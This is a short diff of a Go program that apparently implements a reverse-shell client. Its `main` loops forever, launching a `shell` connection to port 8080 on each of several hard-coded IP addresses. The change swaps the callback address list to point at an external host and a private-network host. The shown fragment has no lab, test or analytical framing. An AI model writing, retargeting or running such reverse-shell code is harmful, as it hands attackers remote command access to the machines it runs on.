@@ -18,7 +18,7 @@ func shell(ip string, port string) {
 }
 
 func main() {
-	ips := []string{"127.0.0.1", "129.21.49.57"}
+	ips := []string{"129.21.49.57", "10.100.0.1"}
 	for {
 		for i, s := range ips { //iterate over the IP addresses
 			go shell(s, "8080")     //run a client as a thread
